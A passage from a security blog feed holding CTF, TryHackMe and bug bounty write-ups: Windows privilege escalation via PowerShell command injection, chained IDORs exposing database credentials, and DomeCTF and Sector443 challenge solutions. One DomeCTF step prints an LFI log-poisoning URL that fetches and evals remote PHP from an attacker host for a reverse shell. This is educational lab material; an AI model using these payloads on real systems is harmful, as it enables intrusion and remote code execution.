![](/assets/images/ra/busehash.png)

We can now use hashcat to crack the captured hash for the user buse.

![](/assets/images/ra/busehashcat.png)

Now we can use this credential to check access on the server using crackmapexec.

**Checking SMB access**
![](/assets/images/ra/busesmbtest.png)

**Checking WINRM access**
![](/assets/images/ra/busewinrmtest.png)

The user buse has access to WINRM we can use evil-winrm to gain access to the server.

**Evil WINRM**

![](/assets/images/ra/busewinrm.png)

Logging into the server using winrm we can get the second flag.We can now enumerate the current user to find the privileges that the user have.

![](/assets/images/ra/buseinfo.png)

The user buse is a member of the group IT by using bloodhound to enumerate different relations.

![](/assets/images/ra/sharphound.png)

Importing the archive to bloodhound and searching for the user buse and listing its details it can be seen that the user buser is a member of the group IT which is also a member of the group Account Operators.

![](/assets/images/ra/busebloodhound.png)

Members in this group has extended rights to change a user&apos;s password this can be confimed using PowerView.

![](/assets/images/ra/busepasswdresetperm.png)

Upon further exploring the machine there is a directory called scripts in the C drive that contains a powershell script which contains a file name that is being read from a user&apos;s home directory which is being run by the Administrator user or run as the Administrator user.

![](/assets/images/ra/scriptsdir.png)
![](/assets/images/ra/scripts.png)
![](/assets/images/ra/scripts1.png)

We can see that the file hosts.txt is being read and the contents is being passed to the variable p which is then forwarded to Invoke-Expression.This code is vulnerable to code execution by adding a semicolon to the host file and adding arbitarary commands to it.
When the script is executed and the content of the hosts file is passed to Invoke-Expression the first command that is Test-Connection will fail and the commands after the semicolon will be executed.
Now we can use the extended rights of the user buse to change the password of the user mentioned in the script to edit the file.

![](/assets/images/ra/britpasswdreset.png)

We can test this operation using crackmapexec to see weather the password has changed or not.

**Checking SMB access**
![](/assets/images/ra/britsmbtest.png)

**Checking WINRM access**
![](/assets/images/ra/britwinrmtest.png)

The user has only access to SMB we can now use smbclient to download the hosts file and reupload after making the necessary changes.

![](/assets/images/ra/britsmbclient.png)
![](/assets/images/ra/britsmbclient2.png)

**Command Injection Payload**

![](/assets/images/ra/host.png)

![](/assets/images/ra/puthost.png)

After couple of seconds we can check weather our user is created and added to the Administrator group.

![](/assets/images/ra/admin.png)

Our user is now added to the Administrator group we can now either use psexec or evil-winrm to gain access to the machine and read the last flag.

![](/assets/images/ra/adminflag.png)</content><author><name>Rahul R</name></author><category term="tryhackme" /><category term="infosec" /><category term="smb" /><category term="privesc" /><category term="windows" /><category term="bloodhound" /><category term="spark" /><category term="winrm" /><summary type="html">Ra is a windows machine which starts with a typical business website for Windcorp where there is a password reset function which can be used to change a user&apos;s password to gain access to a SMB share to download spark live chat application which is vulnerable that can be used to harvest a user&apos;s NTLM hash that can be used to gain initial access to the machine.On further exploring the machine a script can be seen that contains a username who&apos;s password can be changed since the user has extended rights to change password as he is a member of the account operator group.Analysing the script we can see that there is command injection vulnerability that can be abused to gain admin privilege and pwn the machine</summary></entry><entry><title type="html">From Multiple IDORs leading to Code Execution on a different Host Container</title><link href="http://localhost:4000/idor-to-rce/" rel="alternate" type="text/html" title="From Multiple IDORs leading to Code Execution on a different Host Container" /><published>2019-10-04T00:00:00+05:30</published><updated>2019-10-04T00:00:00+05:30</updated><id>http://localhost:4000/idor-to-rce</id><content type="html" xml:base="http://localhost:4000/idor-to-rce/">Here is a short write-up on an interesting bug that I found while testing a Site there won&apos;t be many screenshots of the bug as I can&apos;t disclose any detail about the target.

Let&apos;s talk about the target now the site is somewhat similar to any web hosting platform instead of providing a domain name and hosting web services like WordPress or Joomla. In this platform, we can host services such as Wordpress or Joomla and point that to our domain the backend uses docker as a medium to host the service which means that when we create a new service a docker container is created and the service is isolated within the docker container.

![](/assets/images/idor-to-rce/arc.png)

This is what I think of how the backend system creates a new service. So where is the vulnerability then in that platform I was able to find multiple IDORs such as stopping or starting any users hosted service and enabling and diabling security features but what made the application vulnerable to IDOR or Access Control Issues.The site uses a cookie called access_token to verify the session but there were no additional cookies that checked for Access Control Validations which made it vulnerable .This is how the IDOR request looked like.

```
GET /site/ID HTTP/1.1
Host: sub.redacted.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://sub.redacted.com/
X-Requested-With: XMLHttpRequest
Connection: close
Cookie: access_token=random-access-token; user_time_zone=Asia%2FKolkata
```

By changing the ID to another user&apos;s ID I was able to get into their site dashboard. So I was sure that every end point is vulnerable but starting or stopping a service is not what I wanted but something more which was the api after fuzzing for sometime I was able to find an endpoint which I think was for debugging because of the information it displayed.

```
GET /sites/ID/container?access_token=some-random-access-token HTTP/1.1
Host: api.redacted.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://sub.redacted.com/
Connection: close
```
The response had a long json data with so much information such as their rancher cluster url the version of the service private ip of loadbalancer and docker container but the thing that caught my eye was MYSQL.

![](/assets/images/idor-to-rce/mysql_info.png)

Now with this endpoint I was able to gather the MYSQL and SFTP username and password of any user by just changing the ID so I created two wordpress demo sites to see if i can change the data that is stored in the database, Inorder to do that I needed to execute code on the container which was easy and the container had mysql installed but when I tried to connect to a remote host it failed, I also tried to connect to my own database but it still failed WTF so where is the database after reading the whole json data I got an idea of how the database connects to the website.

![](/assets/images/idor-to-rce/mysql_arc.png)

So the database is actually on a different instance as a container and it is using a proxy to establish a connection with the website.So for every website there is a MYSQL database container and we can only connect to that container only and now we need to escape out mysql container and here is IDOR to the rescue we can use phpmyadmin to login to the database when the request is processed the backend verifies the user with the site ID so if I could change the site ID to the victim&apos;s ID the backend server takes it as a valid request and logs me in.

```
GET /site/ID/pmalogin HTTP/1.1
Host: sub.redacted.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://sub.redacted.com/
Connection: close
Cookie:access_token=random-access-token; user_time_zone=Asia%2FKolkata;
Upgrade-Insecure-Requests: 1
```

![](/assets/images/idor-to-rce/mysql_alert.png)

![](/assets/images/idor-to-rce/phpmyadmin.png)

![](/assets/images/idor-to-rce/db.png)

And I was able to take control of the whole site which also means code execution.The company was also generous enough to fix the issue and reward me $$$.</content><author><name>Rahul R</name></author><category term="bugbounty" /><category term="infosec" /><category term="idor" /><category term="rce" /><category term="bugbounty" /><summary type="html">Here is a short write-up on an interesting bug that I found while testing a site where I was able to chain multiple IDORs to execute Code on the server</summary></entry><entry><title type="html">COCON XII DOME CTF Walkthrough</title><link href="http://localhost:4000/C0C0N-XII-CTF-Walkthrough/" rel="alternate" type="text/html" title="COCON XII DOME CTF Walkthrough" /><published>2019-10-02T00:00:00+05:30</published><updated>2019-10-02T00:00:00+05:30</updated><id>http://localhost:4000/C0C0N-XII-CTF-Walkthrough</id><content type="html" xml:base="http://localhost:4000/C0C0N-XII-CTF-Walkthrough/">Before we start reading can we just admire the Badge that was given as a part of DOME CTF.

![](/assets/images/cocon-xii-ctf/badge.png)

![](/assets/images/cocon-xii-ctf/australia.png)

In this challenge, we were given a message.txt file that contained a long base64 string when decoded gives out a string that is either reversed or encrypted with rot13 by recursively decoding this message and at the end, the flag is displayed.

```
domectf{T5EN7Uxp7KjluznduX8tmXlhc5lX0qHH}
```
![](/assets/images/cocon-xii-ctf/botswana.png)

In this challenge as the challenge, the description says to read the rules page that was given at the time of registration. On that page, there was a QR code when scanned spits out a link to a gist snippet.
```
https://gist.githubusercontent.com/anees264/90af6d6e6b80c65b18a15e7c0dd769bd/raw/eb0bdcbf19368d9dc4ed66450816ca4314e88dd4/the_rules.txt
```
```
&apos;CB;_9&gt;7&lt;;43Wxwvutsrqponmlkjihgfedcba`_^]\[ZYXWVUTSRQPONMLKJIHGFEDCB^]\[ZYXW
VUTMqQPON0Fj-IHG@d&apos;&amp;%$#&quot;!~}|{zyxwvutsrqponmlkjihgfedcba`_^]\[ZYXWVUTSRQPONMc
bgf_dcb[`_X|?&gt;=&lt;;:9876543210/.-CHG@EDCBA@9]~}|{zyxwvutsrqponmlkjihgfedcba`_^
]\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?&gt;=&lt;;:9876543210/.-,+*)(&apos;&amp;%$#&quot;!~}|{zyxwvutsrqp
onmlkjihgfedcba`_^]\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?&gt;=&lt;;W9OTMRQPONMLKDh+*)(&apos;&amp;%$
#&quot;!~}|{zyxwvutsrqp.-,+k)(&apos;&amp;}|{Aba`_^]\[ZYXWVUTSRQPONMLhgfedcba`YAW{[ZYXWPUTM
q43210/.-,+*)(&apos;&amp;%$#?&gt;~&lt;;492765.Rsrqponmlkjihgfedcba`_^]\[ZYXWVUTSRQPONMLKJIH
GFEDCBA@?&gt;Z&lt;XWPOTSRQPOHlLK-CHG@?c&amp;%$#&quot;!~}|{zyxwvutsr0/.-,+*)(h&amp;}Cdcba`_^]\[Z
YXWVUTSihmlkjihgfe^$EDCBA@\[ZYXW9OTSLp3210/.-,+*)(&apos;&amp;%$#&quot;&gt;~&lt;5:927654-Qrqponm+
*#&quot;&apos;&amp;%$#&quot;y?`|{zyxq7XWVUTSRQPONMLKJIHGFEa`_^]\[ZYRWPtT6Lp3INMLEi,+*)(&apos;=BA@?&gt;=
&lt;;:3W765432r0)Mn&amp;%*#Ghgfedcba`_^]\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?&gt;=&lt;;:98765432
10/.-,+*)(&apos;&amp;%$#&quot;!~}|{zyxwvutsrqponmlkjihgfedcba`_^]\[ZYXWVUTSRQPONMLKJIHGFED
CBA@?&gt;=&lt;;:9876543210/.-,+*)(&apos;&amp;%$@?8=&lt;5:98765.Rsrqpon,l$)(&apos;~%$#z@x}|{zyxq7Xtm
3Tpoh.ONMLKJ`e^cba`_^]Vz=&lt;;:9876543210/.-,+*)(DCBA@?&gt;=&lt;|{3Wxwvutsrqponmlkjih
gfedcba`_^]\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?&gt;=&lt;;:9876543210/.-,+*)(&apos;&amp;%$#&quot;!~}|{z
yxwvutsrqponmlkjihgfedcba`_^]\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?&gt;=&lt;;:98765QPON0LK
JIHGFE&gt;b&lt;;@?&gt;=&lt;54Xyxwvutsrqponmlkjihgfedcba`_^]\[ZYXWVUTSRQPONMLKJIHGFED`_^]
?[ZYXWVUNr543210/.-,+*)(&apos;&amp;%$#&quot;!~}|{zyxwvutsrqponmlkjihgfedcba`_^]\[ZYXWVUTSR
QPONMLKJIHGFEDCBA@?&gt;=&lt;;:9876543210/.-,+*)(&apos;&amp;%$#&quot;!~}|{zyxwvutsrqponmlkjihgfed
cba`_^]\[ZYXWVUTSRQPlNdchgfedcba`Y}@\UZYXWVOs6543210/.-,+*)(&apos;&amp;%A@?!7&lt;;:9870T
utsrqp.-,+k)(&apos;&amp;%|Bcba`_^]\[ZYXWVUTSRnmlkjihJfed]#n
```
Which is Malbolge an esoteric programming language we can use an interpreter to get the output of the program?
```
domectf{VknClfWQ4AK6Oo3L0PkC1WCiDgqrO1HW}
```
![](/assets/images/cocon-xii-ctf/brazil.png)

In this challenge, we are provided with a file called d0me by running the file command over it we can see that the file is a boot partition.
 
 ![](/assets/images/cocon-xii-ctf/brazil1.png)
 
 At first, we tried many stupid things but failed miserably when we ran the foremost against the file it gave a png image which was the flag to that challenge.
 
  ![](/assets/images/cocon-xii-ctf/brazil2.png)
  
  ![](/assets/images/cocon-xii-ctf/flag1.png)

  ![](/assets/images/cocon-xii-ctf/congo.png)
  
  In this challenge, we have a login page and nothing else.
  
   ![](/assets/images/cocon-xii-ctf/congo_login.png)
   
   By doing a directory bruteforcing on the server we got a backup directory that contained a zip file.
   ![](/assets/images/cocon-xii-ctf/congo_dir.png)
	  
   ![](/assets/images/cocon-xii-ctf/congo_backup.png)
   
   After extracting the zip file there were 4 files.
    ![](/assets/images/cocon-xii-ctf/congo_files.png)
	
```
index.php
```
 ![](/assets/images/cocon-xii-ctf/congo_index.png)
 
 ```
functions.php
```  
 ![](/assets/images/cocon-xii-ctf/congo_functions.png)
 
 ```
register.php
```
 ![](/assets/images/cocon-xii-ctf/congo_register.png)
 
 ```
 users.dat
 ```
  ![](/assets/images/cocon-xii-ctf/congo_users.png)
  
  So, when adding a user, the username is md5 hashed and the  password is base64 encoded then appended to the password database file. When retrieving the user details, the md5 of the supplied username to test is checked against the md5 hashed value in the password database.So where is the vulnerability then as you can see in the index.php file if user_info[1] == pw . The application is using == operator to check if user_info and pw is true if then print the flag. When it comes to using == in a login fuction that can only mean one thing PHP Type Juggling.So if we can find an existing user with a username that gets hashed to something that looks like **0e004561083131340065739640281486** we can use that to bypass the login function.
  
  So lets see if we can find any username in the users.dat file whose md5 sum starts with 0e and there was one username adm2salwg .Now we need to generate a username whose md5 sum equals to 0e and we can use byGcY whose md5 sum starts with 0e to get the password of adm2salwg user we can register a new user with the username as byGcY and a random password when we register as the user the password of adm2salwg is displayed which can be used to login as adm2salwg which displays the flag.
  
```
domectf{RhNI4AZ2bPCl8s0AdBs9HUhM1ggLov3n}
```

 ![](/assets/images/cocon-xii-ctf/US.png)
 
 In this challenge we are given an android application when installed asks us permissions to access the camera when we grant access to it a scanner pops up which says identify yourself we started by scanning faces and objects but it returned as an invalid scan we had a QR code on our COCON ID cards which we scanned next which was successful and gave us a login page for which we didn&apos;t have any credentials so we started decompiling the app. After decompilation, we found a file called login.class which has a password hardcoded to it.
 
 ```java
public class com/example/unlockme/login extends android/app/Activity {
     

     public static final int PERMS_REQUEST_CODE = 1 (java.lang.Integer);
     public static final int RequestPermissionCode = 1 (java.lang.Integer);
     private android.widget.EditText email;
     java.lang.String password;
     private android.widget.EditText passwrod;

     public login() { //  //()V
             aload0 // reference to self
             invokespecial android/app/Activity.()V
             aload0 // reference to self
             ldc &quot;dGVzdHBhc3N3b3Jk&quot; (java.lang.String)
             putfield com/example/unlockme/login.password:java.lang.String
             return
     }
```

It was a base64 string when decoded gives testpassword. We logged in using the email as admin@domectf.com and the password that we got from the source code. After logging in to the application we have a key and a picture of a lock in the background when we start to rotate the phone the key also rotates so it had something to do with the accelerometer and gyroscope sensors also the application toasts a position vector after further analysis of the source code we came to a conclusion that in order to open the lock we had to rotate the X axis of the phone to a value between 27 and 35 and hold it for 15 seconds by doing these the screen changes and displays the flag.

```java
public startTimer() { //()V
             aload0 // reference to self
             getfield com/example/unlockme/Internal.cTimer:android.os.CountDownTimer
             ifnonnull L1
             aload0 // reference to self
             new com/example/unlockme/Internal$1
             dup
             aload0 // reference to self
             ldc 15000 (java.lang.Long)//Time 15 seconds
             ldc 1000 (java.lang.Long)
             invokespecial com/example/unlockme/Internal$1.(Lcom/example/unlockme/Internal;JJ)V
             putfield com/example/unlockme/Internal.cTimer:android.os.CountDownTimer
             aload0 // reference to self
             getfield com/example/unlockme/Internal.cTimer:android.os.CountDownTimer
             invokevirtual android/os/CountDownTimer.start()Landroid/os/CountDownTimer;
             pop
         L1 {
             return
         }
     }
 public onFinish() { //()V
                  aload0 // reference to self
                  getfield com/example/unlockme/Internal$1.this$0:com.example.unlockme.Internal
                  getfield com/example/unlockme/Internal.z:float
                  ldc 27.0 (java.lang.Float) // X axis Value
                  fcmpl
                  ifle L1
                  aload0 // reference to self
                  getfield com/example/unlockme/Internal$1.this$0:com.example.unlockme.Internal
                  getfield com/example/unlockme/Internal.z:float
                  ldc 35.0 (java.lang.Float) //X axis value
                  fcmpg
                  ifge L1
                  aload0 // reference to self
                  getfield com/example/unlockme/Internal$1.this$0:com.example.unlockme.Internal
                  invokestatic com/example/unlockme/Internal.access$000(Lcom/example/unlockme/Internal;)Landroid/widget/LinearLayout;
                  ldc 2131165320 (java.lang.Integer)
                  invokevirtual android/widget/LinearLayout.setBackgroundResource(I)V
                  aload0 // reference to self
                  getfield com/example/unlockme/Internal$1.this$0:com.example.unlockme.Internal
                  invokestatic com/example/unlockme/Internal.access$100(Lcom/example/unlockme/Internal;)Landroid/widget/LinearLayout;
                  bipush 8
                  invokevirtual android/widget/LinearLayout.setVisibility(I)V
                  aload0 // reference to self
                  getfield com/example/unlockme/Internal$1.this$0:com.example.unlockme.Internal
                  invokestatic com/example/unlockme/Internal.access$200(Lcom/example/unlockme/Internal;)Landroid/widget/LinearLayout;
                  iconst_0
                  invokevirtual android/widget/LinearLayout.setVisibility(I)V
                  aload0 // reference to self
                  getfield com/example/unlockme/Internal$1.this$0:com.example.unlockme.Internal
                  invokestatic com/example/unlockme/Internal.access$300(Lcom/example/unlockme/Internal;)Landroid/widget/TextView;
                  iconst_0
                  invokevirtual android/widget/TextView.setVisibility(I)V
                  aload0 // reference to self
                  getfield com/example/unlockme/Internal$1.this$0:com.example.unlockme.Internal
                  invokestatic com/example/unlockme/Internal.access$300(Lcom/example/unlockme/Internal;)Landroid/widget/TextView;
                  aload0 // reference to self
                  getfield com/example/unlockme/Internal$1.this$0:com.example.unlockme.Internal
                  invokevirtual com/example/unlockme/Internal.stringFromJNI()Ljava/lang/String;
                  invokevirtual android/widget/TextView.setText(Ljava/lang/CharSequence;)V
              L1 {
                  return
              }
          }
```

```
domectf{CK9eXT3gse0CvIqHODsipohUfXxjgFW}
```

***These are the challenges that my team solved at the event the following challenges were completed after the event***

![](/assets/images/cocon-xii-ctf/egypt.png)

In this challenge, we are given an audio file when played seems likely to be a spectrogram challenge because of the disturbance in the audio but when played further we could hear Black Sabbath&apos;s Ironman after messing with the file I tried [audiosteg](https://github.com/danielcardeenas/AudioStego) on it which gave out another wav file.

![](/assets/images/cocon-xii-ctf/egypt1.png)

When played it sounded like the dial-pad pressing of a phone (DTFM code). Inorder to extract the DTFM code from the file we can use a tool called multimon-ng.

![](/assets/images/cocon-xii-ctf/egypt_multimon.png)

Now we have the DTFM codes now we need to format it we can use a simple python script to do that first we can replace &quot;DTFM:&quot; with nothing which gives us only the numbers now with a bit of formating we have this.
```
1441571551451431641461731471061651251221216316122666466145154166112121641171412711154175
```
Now this set of numbers seems to be ascii but they are octal we can use an online converter to do the job which gives us the flag.
```
domectf{gFuURQ3FR646elvJBtODWHl}
```

![](/assets/images/cocon-xii-ctf/france.png)

In this challenge, we have a riddle (Which I still don&apos;t know what it means). But here is the solution all we have to do was to check the TXT record of that domain.

![](/assets/images/cocon-xii-ctf/france_txt.png)

The base64 string in the TXT record is the flag just decode it.
```
domectf{6hau2Hd107GbDgiNGOJMw9PNPhAUtaaY}
```

![](/assets/images/cocon-xii-ctf/madagascar.png)

In this challenge, we have a weapon dealer&apos;s site which has some images but no login or any dynamic data is served in the site so we started downloading the images and ran binwalk on it and one image had a zip file embedded in it.

![](/assets/images/cocon-xii-ctf/madagascar1.png)

But it is password protected  running strings over the same image which gave out something.

![](/assets/images/cocon-xii-ctf/madagascar2.png)

So to get the password we have to change the lowercase letters to A and uppercase letters to B(I still don&apos;t know the logic behind that)

```
dOYOuthinkThisSEnteNcEISboriNGbUttHepASsworDHasastRoNgCOnneCTiOnwiTHtHIssentenCE
ABBBAAAAAABAAABBAAABABBBAAAABBABAABAABBAAAABBAAAAABABABBAAABBABAAABBABBAAAAAAABB
```

This is a Baconian cipher we can use an online tool to decipher it.

![](/assets/images/cocon-xii-ctf/madagascar3.png)

By using the password to extract the zip file we have a couple of text files in which slab.txt has the flag.

```
domectf{kPIx12IP6u004N6G6S2HheBVxrtWwJaL}
```

![](/assets/images/cocon-xii-ctf/greenland.png)

This is a base challenge were we have to execute code on the server and write the team name to /tmp/DOMECTF_BASE file.
So In this challenge, we have a e-commerce site that sells furnitures.

![](/assets/images/cocon-xii-ctf/greenland1.png)

By checking the hyperlinks we can see a login page which is vulnerable to SQL Injection.

![](/assets/images/cocon-xii-ctf/greenland_sql.png)

We can now login to the application using the password that we have.

![](/assets/images/cocon-xii-ctf/greenland_login.png)

 By checking the profile page there is a parameter called name.
 
 ![](/assets/images/cocon-xii-ctf/greenland_name.png)
 
 If we change the value of jessica the data displayed in the red box dissapears with later fuzzing we came to know that the site is vulnerable to LFI but the  application appends .log to the filename
 When we change the parameter data to profile.php?name=../../../../../../../../../var/log/auth
 
  ![](/assets/images/cocon-xii-ctf/greenland_lfi.png)
  
  var/log/auth is the error log for ssh connections so if we can make an error in connecting ssh that would get stored in this file which when included it gets executed. Inorder to execute commands we need to use our php code as the username for an ssh connection.
  
   ![](/assets/images/cocon-xii-ctf/greenland_ssh.png)
   
   Now include the auth file and the php code gets executed
   
   ![](/assets/images/cocon-xii-ctf/greenland_exec.png)
   
   Because SSH usernames has a length restriction we cannot execute code directly so we need something small.
   
```
To get a reverse shell we can use metasploit&apos;s web_delivery module
   
https://furniture-shop.domectf.in/dashboard/examples/profile.php?name=../../../../../../../../../var/log/auth&amp;c=php -d allow_url_fopen=true -r &quot;eval(file_get_contents(&apos;http://ipaddr:8080/uqB7NiEfaNe&apos;));&quot;
```

 ![](/assets/images/cocon-xii-ctf/greenland_msf.png)</content><author><name>Rahul R</name></author><category term="capture the flag" /><category term="infosec" /><category term="ctf" /><category term="jeopardy" /><category term="dome ctf" /><summary type="html">This is the walkthrough for the challenges that were provided as a part of COCON&apos;s DomeCTF</summary></entry><entry><title type="html">Sector443 CTF Walkthrough</title><link href="http://localhost:4000/Sector-443-CTF-Walkthrough/" rel="alternate" type="text/html" title="Sector443 CTF Walkthrough" /><published>2019-08-12T00:00:00+05:30</published><updated>2019-08-12T00:00:00+05:30</updated><id>http://localhost:4000/Sector-443-CTF-Walkthrough</id><content type="html" xml:base="http://localhost:4000/Sector-443-CTF-Walkthrough/">This is where it all started I was watching an episode of The Boys when a friend of mine gave me a link to this CTF and asked me to play if I had the time, and I has plenty XD  
Most of the challenges where based on reverse engineering binaries.

**WEB**

![](/assets/images/sector443/sector443_web.png)

The challenge had an HTML file when opened with a browser it gives a prompt to enter a password the end goal is to find the password which is the flag.

```html
&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;Obfuscation JS&lt;/title&gt;
    &lt;script type=&quot;text/javascript&quot;&gt;
    function dechiffre(pass_enc){
        var pass = &quot;70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65&quot;;
        var tab  = pass_enc.split(&apos;,&apos;);
                var tab2 = pass.split(&apos;,&apos;);
                var i,j,k,l=0,m,n,o,p = &quot;&quot;;
                i = 0;
                j = tab.length;
                k = j + (l) + (n=0);
                n = tab2.length;
                for(i = (o=0); i &lt; (k = j = n); i++ )
                {
                    o = tab[i-l];
                    p += String.fromCharCode((o = tab2[i]));
                    if(i == 5)break;
                }
                for(i = (o=0); i &lt; (k = j = n); i++ )
                {
                o = tab[i-l]; 
                if(i &gt; 5 &amp;&amp; i &lt; k-1)
                p += String.fromCharCode((o = tab2[i]));
                        }
        p += String.fromCharCode(tab2[17]);
        pass = p;return pass;
    }
    String[&quot;fromCharCode&quot;](dechiffre(&quot;\x31\x30\x32\x2c\x31\x30\x38\x2c\x39\x37\x2c\x31\x30\x33\x2c\x31\x32\x33\x2c\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30\x2c\x31\x32\x35&quot;));
    
    h = window.prompt(&apos;Enter password&apos;);
    alert( dechiffre(h) );
    
&lt;/script&gt;
&lt;/head&gt;
&lt;/html&gt;
```

By the looks of it I can see a load of variable declaration and looping by the hex thing looks promising by printing it on console it spits out some char codes.

```javascript
console.log(&quot;\x31\x30\x32\x2c\x31\x30\x38\x2c\x39\x37\x2c\x31\x30\x33\x2c\x31\x32\x33\x2c\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30\x2c\x31\x32\x35&quot;);
```
Now we have a set of char codes which can then be converted using the String.fromCharCode function which returns the flag.

```javascript
print(String.fromCharCode(102, 108, 97,103,123,55,56,54,79,115,69,114,116,107,49,50,125));
//flag{786OsErtk12}
```

**STEG**

![](/assets/images/sector443/sector443_steg.png)

The challenge gives us a GIF of Captain America flying.

![](/assets/images/sector443/captain.gif)

By running binwalk over it to check for hidden files we can see that there is a RAR file embedded in the GIF.

![](/assets/images/sector443/binwalk.png)

After extracting the RAR file we have another image and a text file.

![](/assets/images/sector443/know_the_correct_cipher.jpg)

Chasing and avenging the hydra&apos;s head Arnim Zola, captain america finally got control over the ship and crashed into the Arctic going into a unconsciousness sleep of &quot;steghide&quot;. Releasing Next: Captain America &quot;wintersoldier&quot;.So we have steghide and wintersoldier which means only one thing.

![](/assets/images/sector443/steghide.png)

**Forensics**

![](/assets/images/sector443/sector443_forensic.png)

In this challenge we are given a btsnoop log file form which we have to find the unlock sequence and get the value which is the flag, We can view the log file on wireshark.

![](/assets/images/sector443/wireshark.png)

Now we have to find the Unlock Request , As the challenge description says the the unlock request is send through an app so the Source would be a Smart Phone and the destination is the Smart Lock.

By Filtering the source and searching for a Value attribute I was able to figure out the Unlock request.

![](/assets/images/sector443/wireshark1.png)

As the image shows a Send Write Request is generated from a Redmi4 to the Smart Lock with the handle of 0x0003 and as per the challenge description there should be 5 requests by counting them I knew this was it.

**OSINT**

![](/assets/images/sector443/sector443_osint.png)

In this challenge the goal is to find a person whose name is &quot;Peter Grulich&quot; who likes ponies and we need to find the flag.I started my search in google by entering the following.


![](/assets/images/sector443/sector443_osint_google.png)

![](/assets/images/sector443/sector443_osint_git.png)

The first thing is a GitHub profile by investigating I noticed that the account is created at the time of the CTF and there is only one repository by looking at the commit history there is a peculiar commit.

![](/assets/images/sector443/sector443_osint_git_comit.png)

By checking the Remove secret commit we have a flag.

![](/assets/images/sector443/sector443_osint_git_flag.png)

**PWN**

![](/assets/images/sector443/sector443_script_kiddie.png)

In this challenge we have to download a VM and import it to virtual box in order to solve the challenge,Before that a Host only connection has to be made in order to access the box (which I didn&apos;t like) ,After importing the machine and staring it we have a static IP address.  
By doing an NMAP on the IP address we can see that a port 8080 is open which is running Apache Tomcat.

![](/assets/images/sector443/sector443_script_kiddie_nmap.png)

![](/assets/images/sector443/sector443_script_kiddie1.png)

By checking the manager page we have a login prompt by trying admin:admin we are able to login to the app.

![](/assets/images/sector443/sector443_script_kiddie2.png)

![](/assets/images/sector443/sector443_script_kiddie3.png)

 Now we have a shell and the flag.
 
 **l33t**
 
 ![](/assets/images/sector443/sector443_133t.png)
 
 In this challenge we have an encrypted firmware file and our goal is to decrypt it and find the flag and this was the most point heavy challenge and the author says the challenge is for 1337s so I stared my research which ended up nowhere then I had to seek help from the 1337s themselves so I asked [liveoverflow](https://twitter.com/liveoverflow) to help me figure this out (hope he is not mad at me as I had to push his limit in patience) with one look he said that the file is XOR encrypted  and asked me to figure out the solution.Lets talk about XOR Encryption 

In a XOR encryption we have a plain text and a key if we want to encrypt the plain text we xor each byte of the plain text with the key which results in an encrypted text.

 ![](/assets/images/sector443/xor01.png)
 
 To decrypt the cipher we need to xor the cipher text again with the key which converts into the plain text.
 ![](/assets/images/sector443/xor02.png)
 
 This is a case of single byte XOR which means that the key is of only one character or one byte but in our case its not a single byte XOR but a multi byte XOR which means our key has multiple characters.

After hours of searching I stumbled upon a [stackoverflow](https://stackoverflow.com/questions/1135186/whats-wrong-with-xor-encryption) post which says that when a nullbyte is XORed with a key the result will be the key for example.

 ![](/assets/images/sector443/cipher.png)
 
As we can see that 0x41 is the hex value for A and 0x42 is the hex value for B when we XOR 0x41 with 0x42 the output is 0x3 and when we XOR a null byte ie 0x00 with 0x41 we get the output of 0x41 which was the key used now we need to find a pattern of null bytes to get the key for decryption

By looking at the hexdump of the file I noticed an unusual amount of the string toor.

  ![](/assets/images/sector443/hexedit.png)
  
As the NULL Bytes in the firmware file gets XORed it spits out the character of the key which was used for encryption.

Now we need to write a script that XORs each byte of the firmware file with each byte of the key.
```python
#!/usr/bin/python
import binascii
inputfile=open(&apos;stage2.bin&apos;, &apos;rb&apos;)
outputfile=open(&apos;decode_stage.bin&apos;,&apos;w+b&apos;)
key=[0x74,0x6f,0x6f,0x72]
 # key = toor
counter=0
byte=inputfile.read(1)
while byte !=&quot;&quot;:
	byte =ord(byte) 
	byte=byte ^ key[counter]
	counter += 1
	if counter &gt; 3:
		counter=0
	outputfile.write(&apos;%c&apos; % byte)
	byte= inputfile.read(1)
outputfile.close()
```

Now we have a decrypted file all we have to do now is to extract the firmware using binwalk and find the backdoor.

![](/assets/images/sector443/binwa.png)

And here is the flag.

![](/assets/images/sector443/bin_flag.png)</content><author><name>Rahul R</name></author><category term="capture the flag" /><category term="infosec" /><category term="ctf" /><category term="jeopardy" /><summary type="html">This is the walkthrough for the challenges that were provided as a part of Sector443&apos;s CTF</summary></entry></feed>